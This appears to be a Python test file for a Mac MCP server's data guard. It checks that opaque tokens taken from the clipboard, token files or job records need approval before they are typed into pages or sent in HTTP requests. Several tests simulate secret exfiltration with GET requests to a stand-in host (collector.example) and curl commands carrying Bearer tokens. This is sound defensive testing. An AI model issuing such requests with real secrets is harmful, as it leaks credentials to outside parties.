"""#113: opaque secrets (no known pattern) read on this Mac stay approval-gated when they try to leave.

Every value below is synthetic. Secrets are compared with assertTrue/assertFalse so a failure never
prints one.
"""
from __future__ import annotations

import asyncio
import json
import os
import tempfile
import unittest
import uuid
from dataclasses import replace
from pathlib import Path
from unittest.mock import patch

import tests._state_isolation  # noqa: F401  (must precede mcp_server imports)
from mcp.server.fastmcp.exceptions import ToolError

from mcp_server import data_guard as dg
from mcp_server import tools_jobs
from mcp_server.observability import ObservedFastMCP, TelemetryManager
from mcp_server.policy import PolicyContext, resolve_risk
from mcp_server.security import dashboard_token_path, load_settings
from mcp_server.security_context import SecurityContextManager

# Synthetic opaque keys: mixed case and digits, no prefix any direct-secret pattern knows.
TOKEN = "Qm7vT2xLp9ZkR4wN8bYc3HdF6gJs1VaE"
DASHBOARD = "rK4p_Zt8XqN2vB7mLs0HcW5yJd3FgTa9Ue6Ri1Ok-Pn8VbQ2"
CONNECTOR_KEY = "Hx3Lq8Zv2Nw7Rt5Kp9Ym4Bc6Df1Gs0Ja"


def _gate(manager: SecurityContextManager, tool: str, args: dict, key: str = "k", session: str = "s1"):
    _, risk = resolve_risk(tool, args)
    return manager.evaluate(key=key, public_session_id=session, tool=tool, risk=risk, arguments=args,
                            profile="standard")


def _on_page(manager: SecurityContextManager, url: str, key: str = "k", session: str = "s1") -> None:
    manager.observe_browser_result(key=key, public_session_id=session, tool="browser_observe",
                                   arguments={"browser": "Safari"},
                                   result={"ok": True, "url": url, "tab_handle": "tab-113"})


def _observe(manager: SecurityContextManager, tool: str, args: dict, result: dict,
             key: str = "k", session: str = "s1") -> None:
    manager.observe_host_result(key=key, public_session_id=session, tool=tool, arguments=args, result=result)


def _type(text: str) -> dict:
    return {"browser": "Safari", "css_selector": "#q", "text": text}


class ClipboardOpaqueTokenTests(unittest.TestCase):
    def test_clipboard_token_typed_into_a_page_needs_approval(self) -> None:
        """End to end through the MCP layer: clipboard_get, then browser_type_selector."""
        async def run() -> None:
            with tempfile.TemporaryDirectory() as td:
                telemetry = TelemetryManager(db_path=Path(td) / "telemetry.sqlite3", max_events=100)
                context = PolicyContext(profile="trusted", actor="test")
                mcp = ObservedFastMCP(name="opaque-test", telemetry=telemetry,
                                      policy_context_provider=lambda: context)
                typed: list[str] = []

                @mcp.tool(name="clipboard_get")
                def clipboard_get() -> dict:
                    return {"ok": True, "content": TOKEN + "\n", "length": len(TOKEN) + 1}

                @mcp.tool(name="browser_observe")
                def browser_observe(browser: str = "Safari") -> dict:
                    return {"ok": True, "url": "https://forms.example/x", "tab_handle": "tab-113"}

                @mcp.tool(name="browser_type_selector")
                def browser_type_selector(browser: str, css_selector: str, text: str) -> dict:
                    typed.append(text)
                    return {"ok": True}

                @mcp.tool(name="browser_press_key")
                def browser_press_key(browser: str, key: str, modifiers: list | None = None) -> dict:
                    typed.append(key)
                    return {"ok": True}

                await mcp.call_tool("clipboard_get", {})
                await mcp.call_tool("browser_observe", {"browser": "Safari"})
                with self.assertRaises(ToolError) as ctx:
                    await mcp.call_tool("browser_type_selector", _type(TOKEN))
                self.assertIn("secret_egress_approval_required", str(ctx.exception))
                with self.assertRaises(ToolError):
                    await mcp.call_tool("browser_press_key", {"browser": "Safari", "key": "v", "modifiers": ["cmd"]})
                self.assertEqual([], typed)
                # Ordinary typing on the same page is untouched.
                await mcp.call_tool("browser_type_selector", _type("hello there"))
                self.assertEqual(["hello there"], typed)
        asyncio.run(run())

    def test_clipboard_token_in_an_http_get_needs_approval(self) -> None:
        manager = SecurityContextManager()
        _observe(manager, "clipboard_get", {}, {"ok": True, "content": f"key: {TOKEN}"})
        decision = _gate(manager, "http_request", {"url": f"https://collector.example/c?d={TOKEN}", "method": "GET"})
        self.assertFalse(decision.allowed)
        self.assertEqual("secret_egress_approval_required", decision.code)

    def test_hashes_ids_and_paths_on_the_clipboard_are_not_remembered(self) -> None:
        samples = {
            "git SHA": "9fceb02d0ae598e95dc970b74767f19372d61af8",
            "sha256 hex": "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881",
            "upper-case hex": "2D711642B726B04401627CA9FBAC32F5C8530FB1",
            "UUID": str(uuid.UUID("7ea2b8b3-a1b4-4c3e-9d0f-5a6b7c8d9e0f")),
            "UUID upper": "286A3907-2519-4F7B-8C1D-0E2F3A4B5C6D",
            "docker digest": "sha256:a1fce4363854ff888cff4b8e7875d600c2682390412a8cf79b37d0b11148b0fa",
            "file path": "/Users/someone/Projects/mac-mcp/tests/test_data_guard_2.py",
            "CamelCase identifier": "ExecutionSecurityStateManager2AndSomeMoreWordsHere",
            "env-style name": "MAC_MCP_DECISIONS_OPENAI_API_KEY_2024_ROTATION_SCHEDULE",
            "document link": "https://docs.google.com/spreadsheets/d/1v2atjvIIYeSLp1uzsZV6d8IqLt9zDODCXS7Oilh15QA/edit",
            "release name": "release-2026-10-26-r3-checkpoint-build-17",
        }
        for label, value in samples.items():
            with self.subTest(label):
                scan = dg.scan_sensitive_source("clipboard_get", {}, {"ok": True, "content": value})
                self.assertFalse(scan.sensitive, scan.reasons)
                self.assertEqual(frozenset(), scan.fingerprints)
                manager = SecurityContextManager()
                _observe(manager, "clipboard_get", {}, {"ok": True, "content": value})
                _on_page(manager, "https://chat.example/")
                self.assertTrue(_gate(manager, "browser_type_selector", _type(value)).allowed)

    def test_random_keys_of_common_shapes_are_remembered(self) -> None:
        for token in (TOKEN, DASHBOARD, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"):
            with self.subTest(length=len(token)):
                scan = dg.scan_sensitive_source("clipboard_get", {}, {"ok": True, "content": f"copied {token} here"})
                self.assertTrue(scan.sensitive)
                self.assertIn(dg._digest(token), scan.fingerprints)


class TokenFilePathTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory(prefix="mac-mcp-113-")
        self.root = Path(self.temp.name).resolve()
        self.env = patch.dict(os.environ, {
            "MAC_MCP_DASHBOARD_TOKEN_FILE": str(self.root / "state" / "dashboard-token"),
            "MAC_MCP_CHROME_BRIDGE_TOKEN_FILE": str(self.root / "state" / "chrome-companion-token"),
            "CLOUDFLARE_TUNNEL_TOKEN_FILE": str(self.root / "state" / "cloudflare-tunnel-token"),
        })
        self.env.start()
        (self.root / "state").mkdir()

    def tearDown(self) -> None:
        self.env.stop()
        self.temp.cleanup()

    def test_configured_token_files_are_sensitive_by_canonical_path(self) -> None:
        state = self.root / "state"
        link = self.root / "innocent-name"
        link.symlink_to(state / "dashboard-token")
        for path in (
            state / "dashboard-token", state / "chrome-companion-token", state / "cloudflare-tunnel-token",
            link, self.root / "state" / ".." / "state" / "dashboard-token",
        ):
            with self.subTest(path=path.name):
                self.assertEqual("token_file", dg.sensitive_path_class(str(path)))
        self.assertIsNone(dg.sensitive_path_class(str(state / "notes")))

    def test_dashboard_token_read_then_http_get_needs_approval(self) -> None:
        token_file = dashboard_token_path()
        token_file.write_text(DASHBOARD + "\n", encoding="utf-8")
        manager = SecurityContextManager()
        _observe(manager, "read_file", {"path": str(token_file)},
                 {"ok": True, "path": str(token_file), "content": DASHBOARD + "\n"})
        decision = _gate(manager, "http_request", {"url": f"https://collector.example/c?d={DASHBOARD}", "method": "GET"})
        self.assertFalse(decision.allowed)
        self.assertEqual("secret_egress_approval_required", decision.code)

    def test_token_file_inside_read_multiple_files_counts(self) -> None:
        token_file = dashboard_token_path()
        result = {"ok": True, "files": [
            {"path": str(self.root / "README"), "content": "plain words", "status": "ok"},
            {"path": str(token_file), "content": DASHBOARD + "\n", "status": "ok"},
        ]}
        for delivered in (result, json.dumps(result)):
            scan = dg.scan_sensitive_source("read_multiple_files", {"paths": []}, delivered)
            self.assertTrue(scan.sensitive)
            self.assertEqual("token_file", scan.source_class)
            self.assertIn(dg._digest(DASHBOARD), scan.fingerprints)


class ChatGPTConnectorUrlTests(unittest.TestCase):
    """Owner decision (#85): an API key in a URL query string is never blocked or flagged."""

    def _knows_key(self) -> SecurityContextManager:
        manager = SecurityContextManager()
        _observe(manager, "read_file", {"path": "/Users/v/mac-mcp/mcp_server/.env"},
                 {"ok": True, "content": f"MCP_API_KEY={CONNECTOR_KEY}\n"})
        connector = f"https://mac.example.com/mcp?ApiKey={CONNECTOR_KEY}"
        _observe(manager, "clipboard_get", {}, {"ok": True, "content": connector})
        return manager

    def test_connector_url_with_its_key_can_be_typed_pasted_and_requested(self) -> None:
        manager = self._knows_key()
        _on_page(manager, "https://chatgpt.com/")
        for url in (f"https://mac.example.com/mcp?ApiKey={CONNECTOR_KEY}",
                    f"https://mac.example.com/mcp?api_key={CONNECTOR_KEY}&x=1",
                    f"https://mac.example.com/mcp?apikey={CONNECTOR_KEY}"):
            with self.subTest(url=url.split("?")[1].split("=")[0]):
                self.assertTrue(_gate(manager, "browser_type_selector", _type(url)).allowed)
                self.assertTrue(_gate(manager, "http_request", {"url": url, "method": "GET"}).allowed)
                self.assertTrue(_gate(manager, "browser_open_url", {"browser": "Safari", "url": url}).allowed)
        paste = {"browser": "Safari", "key": "v", "modifiers": ["cmd"]}
        self.assertTrue(_gate(manager, "browser_press_key", paste).allowed)
        _observe(manager, "clipboard_set", {"content": f"https://mac.example.com/mcp?ApiKey={CONNECTOR_KEY}"}, {"ok": True})
        self.assertTrue(_gate(manager, "browser_press_key", paste).allowed)

    def test_the_exception_covers_only_the_api_key_parameter(self) -> None:
        manager = self._knows_key()
        decision = _gate(manager, "http_request", {"url": f"https://collector.example/c?d={CONNECTOR_KEY}", "method": "GET"})
        self.assertFalse(decision.allowed)
        self.assertEqual("secret_egress_approval_required", decision.code)

    def test_logs_still_redact_the_query_key(self) -> None:
        redacted = dg.redact_sensitive_text(f"GET https://mac.example.com/mcp?api_key={CONNECTOR_KEY}")
        self.assertFalse(CONNECTOR_KEY in redacted)


class JobRecordMaskingTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory(prefix="mac-mcp-113-jobs-")
        self.root = Path(self.temp.name).resolve()
        (self.root / "work").mkdir()
        self.jobs = patch.object(tools_jobs, "JOBS_DIR", self.root / "jobs")
        self.jobs.start()
        self.settings = replace(load_settings(), workdir=self.root / "work", allow_shell=True)

    def tearDown(self) -> None:
        self.jobs.stop()
        self.temp.cleanup()

    def test_job_listing_and_record_never_hold_the_token(self) -> None:
        commands = [
            f"export SERVICE_TOKEN={TOKEN}; true",
            f"curl -s -H 'Authorization: Bearer {DASHBOARD}' https://api.example.com/x >/dev/null 2>&1; true",
            f"echo {TOKEN} >/dev/null",
        ]
        result = tools_jobs.run_commands_parallel(self.settings, commands, cwd=str(self.root / "work"), timeout_s=30)
        started = [item["job_id"] for item in result["started"]]
        job = tools_jobs.start_background_job(self.settings, commands[0], cwd=str(self.root / "work"))
        tools_jobs.wait_jobs(self.settings, [job["job_id"]], timeout_s=30)
        listing = json.dumps(tools_jobs.list_jobs(self.settings))
        records = "".join((self.root / "jobs" / job_id / "meta.json").read_text() for job_id in [*started, job["job_id"]])
        for job_id in [*started, job["job_id"]]:
            status = json.dumps(tools_jobs.get_job_status(self.settings, job_id))
            self.assertFalse(TOKEN in status or DASHBOARD in status)
            self.assertIn("[REDACTED]", status)
        self.assertFalse(TOKEN in listing or DASHBOARD in listing)
        self.assertFalse(TOKEN in records or DASHBOARD in records)
        self.assertFalse(TOKEN in json.dumps(job))
        self.assertIn("export SERVICE_TOKEN=[REDACTED]", listing)
        self.assertIn("https://api.example.com/x", listing)

    def test_jobs_are_sensitive_sources(self) -> None:
        old_record = {"ok": True, "jobs": [{"job_id": "a", "command": f"curl -H 'Authorization: Bearer {TOKEN}' x"}]}
        self.assertTrue(dg.scan_sensitive_source("list_jobs", {}, old_record).sensitive)
        self.assertTrue(dg.scan_sensitive_source("get_job_status", {"job_id": "a"}, old_record["jobs"][0]).sensitive)


if __name__ == "__main__":
    unittest.main()
